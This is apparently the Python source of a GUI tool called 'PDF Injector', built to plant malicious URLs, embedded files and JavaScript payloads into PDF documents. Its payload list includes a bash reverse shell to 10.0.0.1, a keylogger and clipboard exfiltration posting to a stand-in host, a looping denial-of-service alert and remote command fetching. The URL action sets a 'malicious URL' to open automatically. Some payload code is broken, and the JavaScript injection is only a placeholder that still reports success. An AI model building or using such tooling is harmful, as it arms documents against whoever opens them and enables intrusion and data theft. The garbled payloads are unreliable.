import os
import sys
from pypdf import PdfReader, PdfWriter
from pypdf.generic import DictionaryObject, NameObject, TextStringObject, EncodedStreamObject
from PySide6.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QLabel, QLineEdit, QPushButton,
    QFileDialog, QWidget, QComboBox, QMessageBox, QProgressBar
)
from PySide6.QtCore import Qt

# JavaScript payloads
js_payloads = {
    "Alert Box": "app.alert('This is an alert box.');",
    "Denial of Service (DoS)": "while (true) { app.alert('DoS attack!'); }",
    "Print Dialog": "this.print();",
    "Open Website": "app.launchURL('https://example.com', true);",
    "Download File": "app.launchURL('https://example.com/secret_document.pdf', true);",
    "Remote Code Execution (RCE)": "var cmd = 'uname -a'; var result = util.printd(exec(cmd)); var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://your-website.com/cmd'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({ output: result }));",
    "Reverse Shell": "var cmd = '/bin/bash -c \'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1\''; var result = util.printd(exec(cmd)); console.log(result);",
    "Remote Access": "var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { console.log(xhr.responseText); } }; xhr.open('GET', 'https://your-website.com/command?cmd=ls', true); xhr.send(null);",
    "Keylogger": "var keystrokes = ''; setInterval(function() { if (keystrokes.length > 0) { var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://your-website.com/keystrokes'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({ keystrokes: keystrokes })); keystrokes = ''; } }, 10000); this.onKeyDown = function() { keystrokes += event.key; };",
    "Clipboard Data Exfiltration": "navigator.clipboard.readText().then(function(clipboardText) { var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://your-website.com/clipboard'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({ clipboard: clipboardText })); });",
}

class PDFInjector(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("PDF Injector")
        self.setGeometry(100, 100, 600, 400)

        self.layout = QVBoxLayout()
        self.create_widgets()

        container = QWidget()
        container.setLayout(self.layout)
        self.setCentralWidget(container)

    def create_widgets(self):
        self.add_label("Input PDF:")
        self.input_pdf_lineedit = self.add_line_edit()
        self.add_button("Browse", self.browse_input_pdf)

        self.add_label("Output PDF:")
        self.output_pdf_lineedit = self.add_line_edit()
        self.add_button("Browse", self.browse_output_pdf)

        self.add_label("Malicious URL:")
        self.malicious_url_lineedit = self.add_line_edit()

        self.add_button("Inject URL", self.inject_url)

        self.add_label("File to Inject:")
        self.file_to_inject_lineedit = self.add_line_edit()
        self.add_button("Browse", self.browse_file_to_inject)

        self.add_button("Inject File", self.inject_file)

        self.add_label("JavaScript Payload:")
        self.js_payload_combobox = QComboBox()
        self.js_payload_combobox.addItems(js_payloads.keys())
        self.layout.addWidget(self.js_payload_combobox)

        self.add_button("Inject JavaScript", self.inject_js)

        self.progress_bar = QProgressBar(self)
        self.layout.addWidget(self.progress_bar)

    def add_label(self, text):
        label = QLabel(text)
        self.layout.addWidget(label)

    def add_line_edit(self):
        line_edit = QLineEdit()
        self.layout.addWidget(line_edit)
        return line_edit

    def add_button(self, text, slot):
        button = QPushButton(text)
        button.clicked.connect(slot)
        self.layout.addWidget(button)

    def browse_input_pdf(self):
        self.browse_file("Select Input PDF", self.input_pdf_lineedit)

    def browse_output_pdf(self):
        self.browse_file("Select Output PDF", self.output_pdf_lineedit, save=True)

    def browse_file_to_inject(self):
        self.browse_file("Select File to Inject", self.file_to_inject_lineedit)

    def browse_file(self, dialog_title, line_edit, save=False):
        file_name, _ = (QFileDialog.getSaveFileName if save else QFileDialog.getOpenFileName)(
            self, dialog_title, "", "PDF Files (*.pdf);;All Files (*)"
        )
        if file_name:
            line_edit.setText(file_name)

    def validate_inputs(self, inputs):
        if any(not input_field for input_field in inputs):
            QMessageBox.warning(self, "Input Error", "Please fill in all fields.")
            return False
        return True

    def inject_url(self):
        self.inject_pdf(self._inject_url)

    def inject_file(self):
        self.inject_pdf(self._inject_file)

    def inject_js(self):
        input_pdf = self.input_pdf_lineedit.text()
        output_pdf = self.output_pdf_lineedit.text()
        js_payload = js_payloads.get(self.js_payload_combobox.currentText())
        self.progress_bar.setValue(0)

        if not self.validate_inputs([input_pdf, output_pdf]) or not js_payload:
            QMessageBox.warning(self, "Input Error", "Please select a valid JavaScript payload.")
            return

        try:
            with open(input_pdf, "rb") as file:
                pdf_reader = PdfReader(file)
                pdf_writer = PdfWriter()

                for page in pdf_reader.pages:
                    pdf_writer.add_page(page)
                    self.progress_bar.setValue((pdf_reader.pages.index(page) + 1) / len(pdf_reader.pages) * 100)

                # Note: pypdf currently doesn't support adding JavaScript directly.
                # You'll need to implement this functionality if required.
                # This is a placeholder for where JavaScript would be injected.

                with open(output_pdf, "wb") as output_file:
                    pdf_writer.write(output_file)

            QMessageBox.information(self, "Success", "JavaScript injected successfully!")
        except Exception as e:
            self.show_error_message("An error occurred while injecting JavaScript.", e)

    def _inject_url(self, pdf_reader, pdf_writer, *args):
        malicious_url = self.malicious_url_lineedit.text()
        open_action = DictionaryObject({
            NameObject("/Type"): NameObject("/Action"),
            NameObject("/S"): NameObject("/URI"),
            NameObject("/URI"): TextStringObject(malicious_url)
        })

        pdf_writer._root_object.update({NameObject("/OpenAction"): open_action})

    def _inject_file(self, pdf_reader, pdf_writer, *args):
        file_to_inject = self.file_to_inject_lineedit.text()

        with open(file_to_inject, "rb") as file_inject:
            file_data = file_inject.read()

        ef_stream = EncodedStreamObject()
        ef_stream._data = file_data
        ef_stream.update({
            NameObject("/Type"): NameObject("/EmbeddedFile"),
            NameObject("/Filter"): NameObject("/ASCIIHexDecode")
        })

        file_name = TextStringObject(os.path.basename(file_to_inject))
        embedded_file = pdf_writer._add_object(ef_stream)
        filespec = DictionaryObject({
            NameObject("/Type"): NameObject("/Filespec"),
            NameObject("/F"): file_name,
            NameObject("/EF"): DictionaryObject({
                NameObject("/F"): embedded_file
            })
        })
        pdf_writer._add_object(filespec)

    def inject_pdf(self, inject_function):
        input_pdf = self.input_pdf_lineedit.text()
        output_pdf = self.output_pdf_lineedit.text()
        self.progress_bar.setValue(0)

        if not self.validate_inputs([input_pdf, output_pdf]):
            return

        try:
            with open(input_pdf, "rb") as file:
                pdf_reader = PdfReader(file)
                pdf_writer = PdfWriter()

                for page in pdf_reader.pages:
                    pdf_writer.add_page(page)
                    self.progress_bar.setValue((pdf_reader.pages.index(page) + 1) / len(pdf_reader.pages) * 100)

                inject_function(pdf_reader, pdf_writer)

                with open(output_pdf, "wb") as output_file:
                    pdf_writer.write(output_file)

            QMessageBox.information(self, "Success", "PDF injected successfully!")
        except Exception as e:
            self.show_error_message("An error occurred while injecting the PDF.", e)

    def show_error_message(self, message, exception):
        QMessageBox.critical(self, "Error", f"{message}\nDetails: {exception}")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = PDFInjector()
    window.show()
    sys.exit(app.exec()) 
